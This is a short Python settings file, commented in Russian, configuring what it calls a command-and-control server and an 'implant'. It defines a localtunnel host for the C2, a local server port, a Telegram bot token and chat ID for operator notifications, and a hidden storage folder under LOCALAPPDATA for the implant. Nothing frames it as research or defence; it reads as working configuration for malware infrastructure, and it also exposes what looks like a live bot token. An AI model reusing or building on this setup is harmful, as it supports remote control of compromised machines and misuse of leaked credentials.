#
# --- Файл: settings.py (Финальная Версия) ---
#
import os

# --- Постоянный Адрес Твоей Крепости ---
# Мы используем постоянный субдомен в localtunnel.
C2_HOST = "marka-c2-fortress-777.loca.lt"

# --- Настройки для Сервера ---
# Локальный порт, на котором будет работать твой c2_server.py.
LOCAL_C2_PORT = 8765

# --- Ключи для Telegram Уведомлений ---
# Твои личные токен и ID чата.
BOT_TOKEN = "7650238850:AAFFcTP5uesNyAreZbW5_gL36brFObm2e34"
CHAT_ID = "1640138978"

# --- Настройки для Импланта ---
# Системная папка для хранения файлов (пока не используется, но пусть будет).
APP_DATA_PATH = os.path.join(os.getenv('LOCALAPPDATA'), 'SCoPeD_Data')